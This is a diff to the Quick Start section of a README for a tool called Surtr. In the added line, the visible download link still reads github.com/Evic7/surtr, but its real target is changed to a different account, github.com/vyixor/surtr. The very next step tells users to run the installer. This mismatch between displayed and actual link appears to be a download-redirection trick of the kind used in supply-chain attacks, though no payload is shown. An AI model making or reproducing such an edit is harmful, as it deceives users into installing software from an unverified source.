@@ -29,7 +29,7 @@ Instead of fragile coordinates or brittle selectors, Surtr **looks at your scree
 
 ## Quick Start (2 minutes)
 
-1. Download the latest release: [https://github.com/Evic7/surtr/releases/latest](https://github.com/Evic7/surtr/releases/latest)
+1. Download the latest release: [https://github.com/Evic7/surtr/releases/latest](https://github.com/vyixor/surtr/releases/latest)
 2. Run the installer (adds to PATH automatically)
 3. Open CMD and test:
 surtr --version
